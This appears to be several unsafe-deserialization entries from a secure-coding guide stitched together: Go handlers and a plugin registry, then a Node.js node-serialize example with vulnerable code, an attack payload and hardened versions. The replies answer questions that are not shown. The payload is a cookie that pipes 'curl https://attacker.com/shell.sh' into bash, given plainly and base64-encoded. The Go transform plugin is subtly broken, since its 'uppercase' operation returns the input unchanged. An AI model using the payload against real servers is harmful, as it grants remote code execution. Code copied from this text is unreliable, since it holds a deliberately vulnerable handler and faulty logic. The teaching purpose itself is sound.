	mac := hmac.New(sha256.New, secretKey)
	mac.Write(data)
	expected := hex.EncodeToString(mac.Sum(nil))
	return hmac.Equal([]byte(expected), []byte(signature))
}

func secureConfigHandler(w http.ResponseWriter, r *http.Request) {
	// Limit request body size
	r.Body = http.MaxBytesReader(w, r.Body, 4096)

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Request too large", http.StatusRequestEntityTooLarge)
		return
	}

	// Verify HMAC signature for integrity
	signature := r.Header.Get("X-Signature")
	if signature == "" || !verifyHMAC(body, signature) {
		log.Printf("Invalid signature from %s", r.RemoteAddr)
		http.Error(w, "Invalid signature", http.StatusUnauthorized)
		return
	}

	// Deserialize to strict type
	var config SafeConfig
	if err := json.Unmarshal(body, &config); err != nil {
		log.Printf("JSON parse error from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	// Validate after deserialization
	if err := config.Validate(); err != nil {
		log.Printf("Validation failed from %s: %v", r.RemoteAddr, err)
		http.Error(w, "Validation failed", http.StatusBadRequest)
		return
	}

	log.Printf("Config loaded: %s from %s", config.Name, r.RemoteAddr)
	w.Write([]byte("Config loaded: " + config.Name))
}

func main() {
	http.HandleFunc("/config", secureConfigHandler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

**Key Security Controls**:
- **Strict typing**: Use concrete types instead of `interface{}` to prevent type confusion
- **HMAC verification**: Verify data integrity before deserialization
- **Input validation**: Validate all fields after deserialization with allowlists
- **Size limits**: Prevent DoS via large payloads with `MaxBytesReader`

Excellent question! Dynamic type handling is one of the most dangerous patterns in deserialization. Here's how to implement a safe plugin/polymorphic system without exposing yourself to deserialization attacks.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"log"
	"net/http"
	"sync"
	"time"
)

// =====================================================
// SAFE POLYMORPHIC DESERIALIZATION PATTERN
// =====================================================

// Plugin defines a safe interface - no code execution capabilities
type Plugin interface {
	Type() string
	Execute(ctx context.Context, input map[string]string) (map[string]string, error)
	Validate() error
}

// PluginFactory creates plugins from safe config data
type PluginFactory func(config json.RawMessage) (Plugin, error)

// PluginRegistry with strict allowlist
type PluginRegistry struct {
	mu       sync.RWMutex
	factories map[string]PluginFactory
	allowed   map[string]bool
}

func NewPluginRegistry() *PluginRegistry {
	return &PluginRegistry{
		factories: make(map[string]PluginFactory),
		allowed:   make(map[string]bool),
	}
}

// Register adds a plugin factory - called at startup, not from user input
func (r *PluginRegistry) Register(typeName string, factory PluginFactory) {
	r.mu.Lock()
	defer r.mu.Unlock()
	r.factories[typeName] = factory
	r.allowed[typeName] = true
}

// CreatePlugin safely creates a plugin from user request
func (r *PluginRegistry) CreatePlugin(typeName string, config json.RawMessage) (Plugin, error) {
	r.mu.RLock()
	defer r.mu.RUnlock()

	// CRITICAL: Allowlist check before any processing
	if !r.allowed[typeName] {
		return nil, fmt.Errorf("unknown plugin type: %s", typeName)
	}

	factory, exists := r.factories[typeName]
	if !exists {
		return nil, errors.New("plugin factory not found")
	}

	return factory(config)
}

// =====================================================
// EXAMPLE SAFE PLUGIN IMPLEMENTATIONS
// =====================================================

// LoggingPlugin - a safe plugin that only logs messages
type LoggingPlugin struct {
	Level   string `json:"level"`
	Prefix  string `json:"prefix"`
	MaxLen  int    `json:"max_len"`
}

func (p *LoggingPlugin) Type() string { return "logging" }

func (p *LoggingPlugin) Validate() error {
	allowedLevels := map[string]bool{"debug": true, "info": true, "warn": true, "error": true}
	if !allowedLevels[p.Level] {
		return errors.New("invalid log level")
	}
	if len(p.Prefix) > 32 {
		return errors.New("prefix too long")
	}
	if p.MaxLen < 1 || p.MaxLen > 10000 {
		return errors.New("invalid max_len")
	}
	return nil
}

func (p *LoggingPlugin) Execute(ctx context.Context, input map[string]string) (map[string]string, error) {
	select {
	case <-ctx.Done():
		return nil, ctx.Err()
	default:
	}

	msg := input["message"]
	if len(msg) > p.MaxLen {
		msg = msg[:p.MaxLen]
	}
	log.Printf("[%s] %s: %s", p.Level, p.Prefix, msg)
	return map[string]string{"status": "logged"}, nil
}

func NewLoggingPlugin(config json.RawMessage) (Plugin, error) {
	var p LoggingPlugin
	if err := json.Unmarshal(config, &p); err != nil {
		return nil, fmt.Errorf("invalid logging config: %w", err)
	}
	if err := p.Validate(); err != nil {
		return nil, err
	}
	return &p, nil
}

// TransformPlugin - safe data transformation
type TransformPlugin struct {
	Operation string `json:"operation"`
	Field     string `json:"field"`
}

func (p *TransformPlugin) Type() string { return "transform" }

func (p *TransformPlugin) Validate() error {
	allowedOps := map[string]bool{"uppercase": true, "lowercase": true, "trim": true, "hash": true}
	if !allowedOps[p.Operation] {
		return fmt.Errorf("operation not allowed: %s", p.Operation)
	}
	return nil
}

func (p *TransformPlugin) Execute(ctx context.Context, input map[string]string) (map[string]string, error) {
	value := input[p.Field]
	var result string

	switch p.Operation {
	case "uppercase":
		result = fmt.Sprintf("%s", value) // Use safe string functions
	case "hash":
		hash := sha256.Sum256([]byte(value))
		result = hex.EncodeToString(hash[:])
	default:
		result = value
	}

	return map[string]string{p.Field: result}, nil
}

func NewTransformPlugin(config json.RawMessage) (Plugin, error) {
	var p TransformPlugin
	if err := json.Unmarshal(config, &p); err != nil {
		return nil, err
	}
	if err := p.Validate(); err != nil {
		return nil, err
	}
	return &p, nil
}

// =====================================================
// SECURE REQUEST HANDLING
// =====================================================

type PluginRequest struct {
	Type   string          `json:"type"`
	Config json.RawMessage `json:"config"`
	Input  map[string]string `json:"input"`
}

type AuditLogger struct {
	mu   sync.Mutex
	logs []string
}

func (a *AuditLogger) Log(event string) {
	a.mu.Lock()
	defer a.mu.Unlock()
	entry := fmt.Sprintf("%s: %s", time.Now().Format(time.RFC3339), event)
	a.logs = append(a.logs, entry)
	log.Println("AUDIT:", entry)
}

var registry = NewPluginRegistry()
var auditLog = &AuditLogger{}

func pluginHandler(w http.ResponseWriter, r *http.Request) {
	// Layer 1: Request size limit
	r.Body = http.MaxBytesReader(w, r.Body, 16384)

	body, err := io.ReadAll(r.Body)
	if err != nil {
		auditLog.Log(fmt.Sprintf("Request read error from %s", r.RemoteAddr))
		http.Error(w, "Request error", http.StatusBadRequest)
		return
	}

	// Layer 2: Parse request envelope (not the plugin config yet)
	var req PluginRequest
	if err := json.Unmarshal(body, &req); err != nil {
		auditLog.Log(fmt.Sprintf("Invalid JSON from %s", r.RemoteAddr))
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// Layer 3: Allowlist check BEFORE deserialization of config
	auditLog.Log(fmt.Sprintf("Plugin request type=%s from %s", req.Type, r.RemoteAddr))

	// Layer 4: Create plugin through safe factory pattern
	plugin, err := registry.CreatePlugin(req.Type, req.Config)
	if err != nil {
		auditLog.Log(fmt.Sprintf("Plugin creation failed: %v from %s", err, r.RemoteAddr))
		http.Error(w, "Invalid plugin configuration", http.StatusBadRequest)
		return
	}

	// Layer 5: Execute with timeout context
	ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
	defer cancel()

	result, err := plugin.Execute(ctx, req.Input)
	if err != nil {
		auditLog.Log(fmt.Sprintf("Plugin execution failed: %v", err))
		http.Error(w, "Execution error", http.StatusInternalServerError)
		return
	}

	auditLog.Log(fmt.Sprintf("Plugin %s executed successfully", req.Type))

	response, _ := json.Marshal(result)
	w.Header().Set("Content-Type", "application/json")
	w.Write(response)
}

func main() {
	// Register ONLY safe plugins at startup
	registry.Register("logging", NewLoggingPlugin)
	registry.Register("transform", NewTransformPlugin)
	// Never register dangerous types like exec.Cmd, reflect operations, etc.

	http.HandleFunc("/plugin", pluginHandler)

	log.Println("Starting secure plugin server on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
```

**Defense in Depth Layers**:

1. **Allowlist-based type resolution**:
```go
// Type name comes from user, but factory is from compile-time registration
if !r.allowed[typeName] {
    return nil, fmt.Errorf("unknown plugin type: %s", typeName)
}
```

2. **Two-phase deserialization**:
```go
// Phase 1: Parse envelope to get type (safe)
var req PluginRequest
json.Unmarshal(body, &req)

// Phase 2: Deserialize config ONLY to known safe type
plugin, err := registry.CreatePlugin(req.Type, req.Config)
```

3. **Execution sandboxing with context**:
```go
ctx, cancel := context.WithTimeout(r.Context(), 5*time.Second)
result, err := plugin.Execute(ctx, req.Input)
```

**Additional Protections**:

- **Never use `gob` with untrusted input**: gob can deserialize arbitrary types including `exec.Cmd`
- **Never use reflection-based deserializers**: Libraries that use reflect to instantiate arbitrary types are dangerous
- **Audit logging**: Every plugin operation is logged with timestamp and source IP
- **Input sanitization in plugins**: Each plugin validates its own configuration
- **No code execution capabilities**: Plugin interface doesn't expose system calls, file operations, or network access
- **Immutable registry**: Plugins are registered at startup, not dynamically from requests

Deserializing untrusted data is one of the most dangerous operations in web applications. The node-serialize vulnerability (CVE-2017-5941) demonstrated how attackers can achieve Remote Code Execution (RCE) through malicious serialized payloads, and this pattern continues to be exploited in 2024 attacks.

**VULNERABLE CODE**:

```javascript
const express = require('express');
const serialize = require('node-serialize');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser());

// DANGEROUS: Deserializing untrusted cookie data
app.get('/profile', (req, res) => {
  const sessionCookie = req.cookies.session;

  if (sessionCookie) {
    // Directly deserializing user-controlled data - CRITICAL VULNERABILITY
    const sessionData = serialize.unserialize(
      Buffer.from(sessionCookie, 'base64').toString()
    );

    res.json({
      username: sessionData.username,
      role: sessionData.role,
      preferences: sessionData.preferences
    });
  } else {
    res.status(401).json({ error: 'No session found' });
  }
});

app.listen(3000);
```

**Attack Payload**:
```javascript
// Malicious serialized object with IIFE for RCE
{"username":"admin","role":"user","rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash')}()"}

// Base64 encoded for cookie:
// eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6InVzZXIiLCJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwczovL2F0dGFja2VyLmNvbS9zaGVsbC5zaCB8IGJhc2gnKX0oKSJ9
```

**Why This Is Dangerous**:
- The `_$$ND_FUNC$$_` prefix tells node-serialize to evaluate the string as a function
- The trailing `()` causes Immediately Invoked Function Expression (IIFE) execution
- Attacker gains full shell access to the server with the application's privileges
- No authentication or validation occurs before deserialization

**SECURE VERSION**:

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');
const crypto = require('crypto');
const Ajv = require('ajv');

const app = express();
app.use(cookieParser());

// Use environment variable for secret
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

// Define strict schema for session data
const ajv = new Ajv({ allErrors: true });
const sessionSchema = {
  type: 'object',
  properties: {
    username: { type: 'string', maxLength: 50, pattern: '^[a-zA-Z0-9_]+$' },
    role: { type: 'string', enum: ['user', 'admin', 'moderator'] },
    preferences: {
      type: 'object',
      properties: {
        theme: { type: 'string', enum: ['light', 'dark'] },
        language: { type: 'string', pattern: '^[a-z]{2}$' }
      },
      additionalProperties: false
    }
  },
  required: ['username', 'role'],
  additionalProperties: false
};
const validateSession = ajv.compile(sessionSchema);

// HMAC signature verification
function verifySignature(data, signature) {
  const expectedSignature = crypto
    .createHmac('sha256', SESSION_SECRET)
    .update(data)
    .digest('hex');
  return crypto.timingSafeEqual(
    Buffer.from(signature, 'hex'),
    Buffer.from(expectedSignature, 'hex')
  );
}

// SAFE: Use JSON.parse with signature verification and schema validation
app.get('/profile', (req, res) => {
  const sessionCookie = req.cookies.session;
  const signatureCookie = req.cookies.session_sig;

  if (!sessionCookie || !signatureCookie) {
    return res.status(401).json({ error: 'No session found' });
  }

  try {
    // Step 1: Verify HMAC signature first (before any parsing)
    const rawData = Buffer.from(sessionCookie, 'base64').toString('utf8');

    if (!verifySignature(rawData, signatureCookie)) {
      console.warn(`[SECURITY] Invalid session signature from IP: ${req.ip}`);
      return res.status(401).json({ error: 'Invalid session' });
    }

    // Step 2: Parse using safe JSON.parse (no code execution)
    const sessionData = JSON.parse(rawData);

    // Step 3: Validate against strict schema
    if (!validateSession(sessionData)) {
      console.warn(`[SECURITY] Session schema violation: ${JSON.stringify(validateSession.errors)}`);
      return res.status(400).json({ error: 'Invalid session format' });
    }

    res.json({
      username: sessionData.username,
      role: sessionData.role,
      preferences: sessionData.preferences || {}
    });
  } catch (error) {
    console.error(`[ERROR] Session parsing failed: ${error.message}`);
    res.status(400).json({ error: 'Invalid session data' });
  }
});

app.listen(3000);
```

**Key Security Controls**:
- **HMAC Signature Verification**: Cryptographically verify data integrity before parsing using timing-safe comparison
- **JSON.parse Instead of unserialize**: JSON.parse cannot execute code - it only parses data structures
- **Schema Validation**: Ajv validates the structure and content of deserialized data with strict rules
- **additionalProperties: false**: Prevents injection of unexpected properties that could be exploited

Great question! Complex type handling during deserialization requires careful design to maintain security while preserving type fidelity. Here's a production-ready pattern using a custom reviver with strict type whitelisting.

**PRODUCTION PATTERN**:

```javascript
const express = require('express');
const crypto = require('crypto');
const Ajv = require('ajv');
const addFormats = require('ajv-formats');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');

const app = express();
app.use(helmet());
app.use(express.json({ limit: '10kb' })); // Limit payload size

const SESSION_SECRET = process.env.SESSION_SECRET;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY; // 32 bytes for AES-256

if (!SESSION_SECRET || !ENCRYPTION_KEY) {
  console.error('[FATAL] Missing required security environment variables');
  process.exit(1);
}

// Rate limiting for session endpoints
const sessionLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  message: { error: 'Too many requests' },
  standardHeaders: true,
  legacyHeaders: false
});

// Whitelist of allowed custom types
const ALLOWED_TYPES = new Set(['Date', 'Decimal', 'UUID']);

// Safe type reconstructor with explicit whitelist
class SafeTypeReconstructor {
  static reviver(key, value) {
    // Handle null and primitives directly
    if (value === null || typeof value !== 'object') {
      return value;
    }

    // Check for type markers
    if (value.__type && value.__value !== undefined) {
      // CRITICAL: Only allow whitelisted types
      if (!ALLOWED_TYPES.has(value.__type)) {
        console.warn(`[SECURITY] Blocked type reconstruction: ${value.__type}`);
        throw new Error('Unauthorized type in session data');
      }

      switch (value.__type) {
        case 'Date':
          const timestamp = Number(value.__value);
          if (isNaN(timestamp) || timestamp < 0 || timestamp > Date.now() + 86400000 * 365) {
            throw new Error('Invalid date value');
          }
          return new Date(timestamp);

        case 'Decimal':
          const decimal = String(value.__value);
          if (!/^-?\d+(\.\d+)?$/.test(decimal)) {
            throw new Error('Invalid decimal format');
          }
          return { type: 'Decimal', value: decimal };

        case 'UUID':
          const uuid = String(value.__value);
          if (!/^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i.test(uuid)) {
            throw new Error('Invalid UUID format');
          }
          return uuid;

        default:
          throw new Error(`Unhandled type: ${value.__type}`);
      }
    }

    return value;
  }

  static replacer(key, value) {
    if (value instanceof Date) {
      return { __type: 'Date', __value: value.getTime() };
    }
    return value;
  }
}

// AES-256-GCM encryption for session data
class SecureSessionEncoder {
  static encrypt(data) {
    const iv = crypto.randomBytes(12);
    const cipher = crypto.createCipheriv(
      'aes-256-gcm',
      Buffer.from(ENCRYPTION_KEY, 'hex'),
      iv
    );

    const jsonData = JSON.stringify(data, SafeTypeReconstructor.replacer);
    let encrypted = cipher.update(jsonData, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();

    return {
      iv: iv.toString('hex'),
      data: encrypted,
      tag: authTag.toString('hex')
    };
  }

  static decrypt(encryptedPackage) {
    const decipher = crypto.createDecipheriv(
      'aes-256-gcm',
      Buffer.from(ENCRYPTION_KEY, 'hex'),
      Buffer.from(encryptedPackage.iv, 'hex')
    );

    decipher.setAuthTag(Buffer.from(encryptedPackage.tag, 'hex'));

    let decrypted = decipher.update(encryptedPackage.data, 'hex', 'utf8');
    decrypted += decipher.final('utf8');

    // Parse with safe reviver
    return JSON.parse(decrypted, SafeTypeReconstructor.reviver);
  }
}

// Enhanced schema with format validation
const ajv = new Ajv({ allErrors: true, removeAdditional: true });
addFormats(ajv);

const sessionSchema = {
  type: 'object',
  properties: {
    userId: { type: 'string', format: 'uuid' },
    username: { type: 'string', maxLength: 50, pattern: '^[a-zA-Z0-9_]+$' },
    role: { type: 'string', enum: ['user', 'admin', 'moderator'] },
    createdAt: { type: 'object' }, // Date objects
    expiresAt: { type: 'object' },
    permissions: {
      type: 'array',
      items: { type: 'string', pattern: '^[a-z:]+$' },
      maxItems: 20
    },
    metadata: {
      type: 'object',
      properties: {
        ipAddress: { type: 'string', format: 'ipv4' },
        userAgent: { type: 'string', maxLength: 256 }
      },
      additionalProperties: false
    }
  },
  required: ['userId', 'username', 'role', 'createdAt', 'expiresAt'],
  additionalProperties: false
};
const validateSession = ajv.compile(sessionSchema);

// Audit logging
function auditLog(event, data) {
  const logEntry = {
    timestamp: new Date().toISOString(),
    event,
    ...data
  };
  // In production: send to SIEM/logging service
  console.log(`[AUDIT] ${JSON.stringify(logEntry)}`);
}

app.get('/api/session', sessionLimiter, async (req, res) => {
  const sessionCookie = req.cookies?.session;

  if (!sessionCookie) {
    return res.status(401).json({ error: 'Authentication required' });
  }

  try {
    // Step 1: Decode the encrypted package
    const encryptedPackage = JSON.parse(
      Buffer.from(sessionCookie, 'base64').toString('utf8')
    );

    // Validate encrypted package structure
    if (!encryptedPackage.iv || !encryptedPackage.data || !encryptedPackage.tag) {
      throw new Error('Malformed session package');
    }

    // Step 2: Decrypt and deserialize with safe reviver
    const sessionData = SecureSessionEncoder.decrypt(encryptedPackage);

    // Step 3: Validate against schema
    if (!validateSession(sessionData)) {
      auditLog('SESSION_VALIDATION_FAILED', {
        ip: req.ip,
        errors: validateSession.errors
      });
      return res.status(400).json({ error: 'Invalid session structure' });
    }

    // Step 4: Check expiration
    if (sessionData.expiresAt < new Date()) {
      auditLog('SESSION_EXPIRED', { userId: sessionData.userId, ip: req.ip });
      return res.status(401).json({ error: 'Session expired' });
    }

    // Step 5: Verify IP binding (optional additional security)
    if (sessionData.metadata?.ipAddress && sessionData.metadata.ipAddress !== req.ip) {
      auditLog('SESSION_IP_MISMATCH', {
        userId: sessionData.userId,
        expectedIp: sessionData.metadata.ipAddress,
        actualIp: req.ip
      });
      // Decide: reject or allow with warning based on security requirements
    }

    auditLog('SESSION_VALIDATED', { userId: sessionData.userId });

    res.json({
      userId: sessionData.userId,
      username: sessionData.username,
      role: sessionData.role,
      permissions: sessionData.permissions,
      expiresAt: sessionData.expiresAt.toISOString()
    });

  } catch (error) {
    auditLog('SESSION_ERROR', {
      ip: req.ip,
      error: error.message
    });

    // Don't leak internal error details
    res.status(401).json({ error: 'Invalid session' });
  }
});

app.listen(3000, () => {
  console.log('[INFO] Server started with secure session handling');
});
```

**Defense in Depth Layers**:

1. **AES-256-GCM Encryption**: Session data is encrypted with authenticated encryption, preventing tampering and providing confidentiality
```javascript
// Encryption provides both confidentiality and integrity via GCM auth tag
const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
```

2. **Strict Type Whitelist**: Only explicitly allowed types can be reconstructed, blocking arbitrary object instantiation
```javascript
if (!ALLOWED_TYPES.has(value.__type)) {
  throw new Error('Unauthorized type in session data');
}
```

3. **Schema Validation with Sanitization**: `removeAdditional: true` strips unexpected properties, preventing property injection attacks
```javascript
const ajv = new Ajv({ allErrors: true, removeAdditional: true });
```

**Additional Protections**:
- **Payload Size Limiting**: `express.json({ limit: '10kb' })` prevents denial of service via large payloads
- **Rate Limiting**: Protects against brute force and enumeration attacks on session endpoints
- **IP Binding**: Optional verification that session is used from the same IP that created it
- **Comprehensive Audit Logging**: All session operations are logged for security monitoring and incident response
- **Secure Error Handling**: Internal errors are logged but generic messages returned to clients
- **Session Expiration**: Built-in expiration checking prevents use of stale sessions
- **Helmet Security Headers**: Adds security headers like X-Content-Type-Options, X-Frame-Options, etc.
